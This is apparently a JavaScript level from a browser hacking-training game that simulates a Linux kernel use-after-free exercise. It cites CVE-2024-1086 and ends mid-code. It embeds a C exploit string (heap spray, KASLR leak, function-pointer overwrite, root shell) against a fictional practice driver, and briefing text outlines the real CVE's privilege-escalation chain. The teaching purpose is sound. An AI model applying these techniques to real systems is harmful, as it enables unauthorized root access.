<script>
// ============================================
// LEVEL 5: KERNEL EXPLOITATION - Ring Zero
// Linux Kernel UAF + Heap Spray + Privesc
// ============================================

const KERNEL_MODULE = {
  name: 'nf_tables',
  version: '1.0.5',
  vulnerability: 'Use-After-Free in nft_verdict_init()',
  cve: 'CVE-2024-1086',
  // Real CVE-2024-1086 details from Notselwyn's research
  // https://github.com/Notselwyn/CVE-2024-1086
  affected_versions: 'Linux 5.14 - 6.6',
  success_rate: '99.4%',
  ioctl_codes: {
    ALLOC_OBJ: 0x1337,
    FREE_OBJ: 0x1338,
    USE_OBJ: 0x1339,
    READ_OBJ: 0x133A
  },
  obj_size: 192, // nft_rule size
  kernel_version: '6.1.0-generic',
  exploit_technique: 'Double-free via nf_hook_slow() -> Physical Memory Scanning -> modprobe_path overwrite'
};

const KERNEL_EXPLOIT_CODE = `// exploit.c - Linux Kernel UAF Exploit
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/msg.h>
#include <sys/ipc.h>

#define VULN_DEV "/dev/vuln_driver"
#define ALLOC_OBJ 0x1337
#define FREE_OBJ  0x1338
#define USE_OBJ   0x1339
#define READ_OBJ  0x133A

// msg_msg structure for heap spray
struct msg_buf {
    long mtype;
    char mtext[96 - 48];  // Same size as vuln object
};

// Fake object to overwrite function pointer
struct fake_obj {
    unsigned long padding[10];
    unsigned long func_ptr;  // Offset 80 - function pointer
    unsigned long data;
};

int spray_msgs(int count) {
    struct msg_buf msg;
    msg.mtype = 1;
    memset(msg.mtext, 'A', sizeof(msg.mtext));

    // Create message queues for spray
    int qids[count];
    for (int i = 0; i < count; i++) {
        qids[i] = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
        if (qids[i] < 0) return -1;
        msgsnd(qids[i], &msg, sizeof(msg.mtext), 0);
    }
    return 0;
}

unsigned long leak_kernel_base(int fd) {
    char buf[256];
    // Trigger read on freed object to leak pointer
    ioctl(fd, READ_OBJ, buf);
    unsigned long *leak = (unsigned long *)buf;
    return leak[0] - 0xffffffff81000000; // Calculate KASLR slide
}

int main() {
    int fd = open(VULN_DEV, O_RDWR);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    printf("[*] Stage 1: Allocating vulnerable object...\\n");
    ioctl(fd, ALLOC_OBJ, NULL);

    printf("[*] Stage 2: Freeing object (UAF trigger)...\\n");
    ioctl(fd, FREE_OBJ, NULL);

    printf("[*] Stage 3: Heap spray with msg_msg...\\n");
    spray_msgs(100);

    printf("[*] Stage 4: Leaking kernel base...\\n");
    unsigned long kaslr_base = leak_kernel_base(fd);
    printf("[+] KASLR base: 0x%lx\\n", kaslr_base);

    printf("[*] Stage 5: Overwriting function pointer...\\n");
    struct fake_obj fake;
    memset(&fake, 0, sizeof(fake));
    // Point to commit_creds(prepare_kernel_cred(0))
    fake.func_ptr = kaslr_base + 0x123456; // ROP gadget

    printf("[*] Stage 6: Triggering code execution...\\n");
    ioctl(fd, USE_OBJ, &fake);

    printf("[+] Checking privileges...\\n");
    if (getuid() == 0) {
        printf("[+] ROOT OBTAINED!\\n");
        system("/bin/sh");
    }

    close(fd);
    return 0;
}`;

async function initLevel5() {
  gameState.levelState = {
    // Recon Phase
    analyzedModule: false,
    foundVuln: false,
    reversedIoctl: false,
    identifiedUAF: false,

    // Exploitation Phase
    allocatedObject: false,
    freedObject: false,
    heapSprayed: false,
    leakedPointer: false,
    calculatedKaslr: false,

    // Privilege Escalation
    overwrotePtr: false,
    triggeredExploit: false,
    gotRoot: false,

    // State
    kernelBase: null,
    kaslrSlide: null,
    currentUser: 'user',
    exploitLoaded: false,
    debugMode: false
  };

  clear();
  print('');
  print('â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—', 'error');
  print('â•‘                     LEVEL 5: KERNEL EXPLOITATION                                  â•‘', 'error');
  print('â•‘                   CVE-2024-1086 - "Flipping Pages"                                â•‘', 'warning');
  print('â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£', 'error');
  print('â•‘                                                                                   â•‘', 'info');
  print('â•‘              â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—                    â•‘', 'info');
  print('â•‘              â•‘            KERNEL SPACE (Ring 0)              â•‘                    â•‘', 'error');
  print('â•‘              â•‘  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â•‘                    â•‘', 'error');
  print('â•‘              â•‘  â”‚         netfilter/nf_tables             â”‚  â•‘                    â•‘', 'error');
  print('â•‘              â•‘  â”‚                                         â”‚  â•‘                    â•‘', 'error');
  print('â•‘              â•‘  â”‚  nft_verdict_init() allows positive     â”‚â—„â”€â•¬â”€â”€ DOUBLE-FREE!    â•‘', 'warning');
  print('â•‘              â•‘  â”‚  values as NF_DROP error codes          â”‚  â•‘                    â•‘', 'error');
  print('â•‘              â•‘  â”‚           â”‚                             â”‚  â•‘                    â•‘', 'error');
  print('â•‘              â•‘  â”‚           â–¼                             â”‚  â•‘                    â•‘', 'error');
  print('â•‘              â•‘  â”‚  nf_hook_slow() double-frees skb        â”‚  â•‘                    â•‘', 'error');
  print('â•‘              â•‘  â”‚  when NF_DROP == NF_ACCEPT behavior     â”‚  â•‘                    â•‘', 'error');
  print('â•‘              â•‘  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â•‘                    â•‘', 'error');
  print('â•‘              â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£                    â•‘', 'info');
  print('â•‘              â•‘   Unprivileged User Namespaces (enabled)      â•‘                    â•‘', 'success');
  print('â•‘              â•‘   [YOUR EXPLOIT CODE RUNS HERE]               â•‘                    â•‘', 'success');
  print('â•‘              â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                    â•‘', 'info');
  print('â•‘                                                                                   â•‘', 'info');
  print('â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£', 'error');
  print('â•‘  CVE:        CVE-2024-1086 (CVSS 7.8 HIGH) - Active exploitation in wild         â•‘', 'error');
  print('â•‘  KERNEL:     Linux 6.1.0-generic (KASLR, SMEP, SMAP, KPTI enabled)               â•‘', 'system');
  print('â•‘  AFFECTED:   Linux kernels 5.14 - 6.6 (Debian, Ubuntu, KernelCTF)                â•‘', 'warning');
  print('â•‘  ACCESS:     Low-privilege user with unprivileged user namespaces                â•‘', 'system');
  print('â•‘  GOAL:       Exploit double-free to overwrite modprobe_path â†’ root               â•‘', 'error');
  print('â•‘                                                                                   â•‘', 'info');
  print('â•‘  EXPLOIT CHAIN (Notselwyn/CVE-2024-1086):                                         â•‘', 'info');
  print('â•‘    [1] Trigger double-free via nft_verdict_init() bug                            â•‘', 'warning');
  print('â•‘    [2] Physical memory scanning to locate kernel base                            â•‘', 'warning');
  print('â•‘    [3] Bypass KASLR using Page Table Entry manipulation                          â•‘', 'warning');
  print('â•‘    [4] Overwrite modprobe_path with /tmp/pwn script                              â•‘', 'warning');
  print('â•‘    [5] Trigger modprobe execution â†’ root shell                                   â•‘', 'warning');
  print('â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'error');
  print('');

  await typeText('[BRIEFING] Target system is vulnerable to CVE-2024-1086', 30, 'system');
  await typeText('[BRIEFING] netfilter nf_tables has a double-free in nft_verdict_init()', 30, 'warning');
  await typeText('[BRIEFING] Success rate: 99.4% on KernelCTF images', 30, 'success');
  await typeText('[BRIEFING] Exploit it to escalate from user to root', 30, 'info');
  print('');
  print('[*] Reference: https://github.com/Notselwyn/CVE-2024-1086', 'muted');
  print('[*] Writeup: "Flipping Pages" - pwning.tech', 'muted');
  print('');

  updateHUD('5 - Kernel', 'CVE-2024-1086', 'modprobe_path â†’ root', 0);
  setPrompt('user', 'target', '~');
}

async function handleLevel5Command(cmd, args) {
  const state = gameState.levelState;
  const fullCmd = args.length > 0 ? `${cmd} ${args.join(' ')}` : cmd;

  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // HELP COMMAND
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  if (cmd === 'help') {
    print('');
    print('â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—', 'info');
    print('â•‘                              LEVEL 5 COMMANDS                                      â•‘', 'info');
    print('â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£', 'info');
    print('â•‘  RECONNAISSANCE:                                                                   â•‘', 'info');
    print('â•‘    lsmod                       List loaded kernel modules                          â•‘', 'system');
    print('â•‘    modinfo vuln_driver         Get module information                              â•‘', 'system');
    print('â•‘    dmesg                       View kernel messages                                â•‘', 'system');
    print('â•‘    cat /proc/kallsyms          View kernel symbols (needs root or leak)            â•‘', 'system');
    print('â•‘                                                                                    â•‘', 'info');
    print('â•‘  ANALYSIS:                                                                         â•‘', 'warning');
    print('â•‘    analyze                     Analyze the vulnerable driver                       â•‘', 'success');
    print('â•‘    disasm                      Disassemble driver IOCTL handler                    â•‘', 'success');
    print('â•‘    struct                      View vulnerable object structure                    â•‘', 'system');
    print('â•‘                                                                                    â•‘', 'info');
    print('â•‘  EXPLOITATION:                                                                     â•‘', 'error');
    print('â•‘    ioctl alloc                 Trigger ALLOC_OBJ (0x1337)                          â•‘', 'warning');
    print('â•‘    ioctl free                  Trigger FREE_OBJ (0x1338) - creates dangling ptr   â•‘', 'warning');
    print('â•‘    ioctl use                   Trigger USE_OBJ (0x1339) - UAF trigger!            â•‘', 'error');
    print('â•‘    ioctl read                  Trigger READ_OBJ (0x133A) - leak data              â•‘', 'warning');
    print('â•‘    spray                       Heap spray with msg_msg to reclaim freed object    â•‘', 'success');
    print('â•‘    leak                        Attempt to leak kernel pointers                     â•‘', 'success');
    print('â•‘    exploit                     Run full exploit chain                              â•‘', 'error');
    print('â•‘                                                                                    â•‘', 'info');
    print('â•‘  DEBUGGING:                                                                        â•‘', 'info');
    print('â•‘    gdb                         Attach GDB to kernel (debug mode)                   â•‘', 'system');
    print('â•‘    kaddr <symbol>              Look up kernel symbol address                       â•‘', 'system');
    print('â•‘                                                                                    â•‘', 'info');
    print('â•‘  UTILITY:                                                                          â•‘', 'info');
    print('â•‘    status                      Show progress                                       â•‘', 'success');
    print('â•‘    hint                        Get contextual hint                                 â•‘', 'warning');
    print('â•‘    id / whoami                 Check current privileges                            â•‘', 'system');
    print('â•‘    exit                        Return to main menu                                 â•‘', 'system');
    print('â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'info');
    print('');
    return;
  }

  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // STATUS COMMAND
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  if (cmd === 'status') {
    const progress = calculateLevel5Progress(state);
    print('');
    print('â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—', 'info');
    print('â•‘             LEVEL 5 PROGRESS - KERNEL EXPLOITATION                â•‘', 'info');
    print('â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£', 'info');
    print('â•‘  RECONNAISSANCE:                                                  â•‘', 'info');
    print(`â•‘    [${state.analyzedModule ? 'âœ“' : ' '}] Kernel module analyzed                              â•‘`, state.analyzedModule ? 'success' : 'system');
    print(`â•‘    [${state.foundVuln ? 'âœ“' : ' '}] Vulnerability identified                               â•‘`, state.foundVuln ? 'success' : 'system');
    print(`â•‘    [${state.reversedIoctl ? 'âœ“' : ' '}] IOCTL interface reversed                              â•‘`, state.reversedIoctl ? 'success' : 'system');
    print('â•‘                                                                   â•‘', 'info');
    print('â•‘  EXPLOITATION CHAIN:                                              â•‘', 'warning');
    print(`â•‘    [${state.allocatedObject ? 'âœ“' : ' '}] Object allocated                                     â•‘`, state.allocatedObject ? 'success' : 'system');
    print(`â•‘    [${state.freedObject ? 'âœ“' : ' '}] Object freed (dangling pointer created)              â•‘`, state.freedObject ? 'success' : 'system');
    print(`â•‘    [${state.heapSprayed ? 'âœ“' : ' '}] Heap sprayed with msg_msg                             â•‘`, state.heapSprayed ? 'success' : 'system');
    print(`â•‘    [${state.leakedPointer ? 'âœ“' : ' '}] Kernel pointer leaked                                 â•‘`, state.leakedPointer ? 'success' : 'system');
    print(`â•‘    [${state.calculatedKaslr ? 'âœ“' : ' '}] KASLR base calculated                                â•‘`, state.calculatedKaslr ? 'success' : 'system');
    print('â•‘                                                                   â•‘', 'info');
    print('â•‘  PRIVILEGE ESCALATION:                                            â•‘', 'error');
    print(`â•‘    [${state.overwrotePtr ? 'âœ“' : ' '}] Function pointer overwritten                         â•‘`, state.overwrotePtr ? 'success' : 'system');
    print(`â•‘    [${state.triggeredExploit ? 'âœ“' : ' '}] Exploit triggered                                     â•‘`, state.triggeredExploit ? 'success' : 'system');
    print(`â•‘    [${state.gotRoot ? 'âœ“' : ' '}] ROOT OBTAINED                                          â•‘`, state.gotRoot ? 'success' : 'system');
    print('â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£', 'info');
    print(`â•‘  Progress: ${String(progress).padStart(3)}%                                                  â•‘`, progress === 100 ? 'success' : 'warning');
    print(`â•‘  Current: ${state.currentUser}@target                                          â•‘`, state.currentUser === 'root' ? 'success' : 'system');
    if (state.kernelBase) {
      print(`â•‘  Kernel Base: ${state.kernelBase}                           â•‘`, 'success');
    }
    print('â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'info');
    print('');
    updateHUD('5 - Kernel', 'vuln_driver.ko', 'Root via UAF', progress);
    return;
  }

  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // HINT COMMAND
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  if (cmd === 'hint') {
    print('');
    print('ğŸ’¡ HINT:', 'warning');

    if (!state.analyzedModule) {
      print('Start by analyzing the vulnerable kernel module.', 'info');
      print('Try: analyze', 'success');
    } else if (!state.reversedIoctl) {
      print('Understand the IOCTL interface to interact with the driver.', 'info');
      print('Try: disasm', 'success');
    } else if (!state.allocatedObject) {
      print('Trigger object allocation using IOCTL.', 'info');
      print('Try: ioctl alloc', 'success');
    } else if (!state.freedObject) {
      print('Free the object to create a dangling pointer.', 'info');
      print('Try: ioctl free', 'success');
    } else if (!state.heapSprayed) {
      print('Spray the heap to reclaim the freed memory with controlled data.', 'info');
      print('msg_msg is commonly used - same slab size as our object.', 'info');
      print('Try: spray', 'success');
    } else if (!state.leakedPointer) {
      print('Leak kernel pointers through the UAF read.', 'info');
      print('Try: leak', 'success');
    } else if (!state.calculatedKaslr) {
      print('Calculate the KASLR base from leaked pointers.', 'info');
      print('The leak should give you: kbase = leaked_addr - known_offset', 'info');
    } else if (!state.gotRoot) {
      print('Run the full exploit chain to get root.', 'info');
      print('Try: exploit', 'success');
    } else {
      print('You have root! Verify with: id', 'success');
    }
    print('');
    return;
  }

  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // LSMOD - List kernel modules
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  if (cmd === 'lsmod') {
    print('Module                  Size  Used by', 'info');
    print('vuln_driver            16384  0', 'warning');
    print('btrfs                1282048  1', 'system');
    print('xor                    24576  1 btrfs', 'system');
    print('raid6_pq              114688  1 btrfs', 'system');
    print('ufs                    81920  0', 'system');
    print('qnx4                   16384  0', 'system');
    print('hfsplus               110592  0', 'system');
    print('... (truncated)', 'system');
    return;
  }

  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // MODINFO - Module information
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  if (cmd === 'modinfo') {
    if (args[0] === 'vuln_driver') {
      print('filename:       /lib/modules/5.15.0-generic/kernel/drivers/misc/vuln_driver.ko', 'system');
      print('version:        1.0', 'system');
      print('description:    Vulnerable driver for kernel exploitation practice', 'warning');
      print('author:         ctf_challenge', 'system');
      print('license:        GPL', 'system');
      print('srcversion:     A1B2C3D4E5F6G7H8', 'system');
      print('depends:        ', 'system');
      print('retpoline:      Y', 'system');
      print('name:           vuln_driver', 'system');
      print('vermagic:       5.15.0-generic SMP mod_unload modversions', 'system');
      return;
    }
    print(`modinfo: Module ${args[0]} not found.`, 'error');
    return;
  }

  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // DMESG - Kernel messages
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  if (cmd === 'dmesg') {
    print('[    0.000000] Linux version 5.15.0-generic (gcc 11.2.0)', 'system');
    print('[    0.000000] KASLR enabled', 'warning');
    print('[    0.000000] SMEP enabled, SMAP enabled', 'warning');
    print('...', 'system');
    print('[   15.234567] vuln_driver: module loaded', 'success');
    print('[   15.234568] vuln_driver: device registered at /dev/vuln_driver', 'success');
    if (state.allocatedObject) {
      print('[   XX.XXXXXX] vuln_driver: object allocated at 0xffff888012345000', 'system');
    }
    if (state.freedObject) {
      print('[   XX.XXXXXX] vuln_driver: object freed', 'warning');
    }
    if (state.triggeredExploit) {
      print('[   XX.XXXXXX] vuln_driver: USE_OBJ called on freed object!', 'error');
    }
    return;
  }

  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // ANALYZE - Analyze vulnerable driver
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  if (cmd === 'analyze') {
    await simulateLoading('Analyzing vuln_driver.ko', 3000);
    print('');
    print('â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—', 'warning');
    print('â•‘                     VULNERABLE DRIVER ANALYSIS                                   â•‘', 'warning');
    print('â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£', 'warning');
    print('â•‘  Module:      vuln_driver.ko                                                     â•‘', 'system');
    print('â•‘  Device:      /dev/vuln_driver (char device)                                     â•‘', 'system');
    print('â•‘  Permissions: crw-rw-rw- (world readable/writable!)                              â•‘', 'success');
    print('â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£', 'warning');
    print('â•‘  VULNERABILITY FOUND: Use-After-Free                                             â•‘', 'error');
    print('â•‘                                                                                  â•‘', 'info');
    print('â•‘  The driver maintains a global object pointer:                                   â•‘', 'info');
    print('â•‘    static struct vuln_obj *global_obj = NULL;                                    â•‘', 'system');
    print('â•‘                                                                                  â•‘', 'info');
    print('â•‘  ALLOC_OBJ (0x1337):  global_obj = kmalloc(96, GFP_KERNEL);                      â•‘', 'system');
    print('â•‘  FREE_OBJ  (0x1338):  kfree(global_obj);  // NO NULL ASSIGNMENT!                 â•‘', 'error');
    print('â•‘  USE_OBJ   (0x1339):  global_obj->func_ptr(global_obj);  // CALLS FREED PTR!    â•‘', 'error');
    print('â•‘  READ_OBJ  (0x133A):  copy_to_user(buf, global_obj, 96);  // LEAK!             â•‘', 'warning');
    print('â•‘                                                                                  â•‘', 'info');
    print('â•‘  EXPLOITATION STRATEGY:                                                          â•‘', 'success');
    print('â•‘    1. ALLOC_OBJ - Allocate the object                                            â•‘', 'system');
    print('â•‘    2. FREE_OBJ  - Free it (creates dangling pointer)                             â•‘', 'system');
    print('â•‘    3. SPRAY     - Heap spray to reclaim memory with controlled data              â•‘', 'system');
    print('â•‘    4. READ_OBJ  - Leak kernel pointers to defeat KASLR                           â•‘', 'system');
    print('â•‘    5. USE_OBJ   - Trigger function pointer call with our ROP chain               â•‘', 'system');
    print('â•‘                                                                                  â•‘', 'info');
    print('â•‘  Object Size: 96 bytes (kmalloc-96 slab)                                         â•‘', 'info');
    print('â•‘  msg_msg header is 48 bytes, so we need 48 bytes of mtext for same slab!        â•‘', 'success');
    print('â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'warning');
    print('');

    state.analyzedModule = true;
    state.foundVuln = true;
    state.identifiedUAF = true;
    autosave();
    return;
  }

  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // DISASM - Disassemble IOCTL handler
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  if (cmd === 'disasm') {
    if (!state.analyzedModule) {
      print('[!] Analyze the module first', 'warning');
      return;
    }

    print('');
    print('â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—', 'info');
    print('â•‘                    IOCTL HANDLER DISASSEMBLY                             â•‘', 'info');
    print('â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£', 'info');
    print('â•‘  vuln_driver_ioctl:                                                      â•‘', 'system');
    print('â•‘    push   rbp                                                            â•‘', 'system');
    print('â•‘    mov    rbp, rsp                                                       â•‘', 'system');
    print('â•‘    cmp    esi, 0x1337            ; ALLOC_OBJ                             â•‘', 'system');
    print('â•‘    je     alloc_handler                                                  â•‘', 'system');
    print('â•‘    cmp    esi, 0x1338            ; FREE_OBJ                              â•‘', 'system');
    print('â•‘    je     free_handler                                                   â•‘', 'system');
    print('â•‘    cmp    esi, 0x1339            ; USE_OBJ                               â•‘', 'system');
    print('â•‘    je     use_handler                                                    â•‘', 'system');
    print('â•‘    cmp    esi, 0x133A            ; READ_OBJ                              â•‘', 'system');
    print('â•‘    je     read_handler                                                   â•‘', 'system');
    print('â•‘    ...                                                                   â•‘', 'system');
    print('â•‘                                                                          â•‘', 'info');
    print('â•‘  free_handler:                                                           â•‘', 'warning');
    print('â•‘    mov    rdi, [global_obj]                                              â•‘', 'warning');
    print('â•‘    call   kfree                                                          â•‘', 'warning');
    print('â•‘    ret                           ; BUG: global_obj not set to NULL!      â•‘', 'error');
    print('â•‘                                                                          â•‘', 'info');
    print('â•‘  use_handler:                                                            â•‘', 'error');
    print('â•‘    mov    rax, [global_obj]      ; Uses potentially freed pointer        â•‘', 'error');
    print('â•‘    mov    rdi, rax                                                       â•‘', 'error');
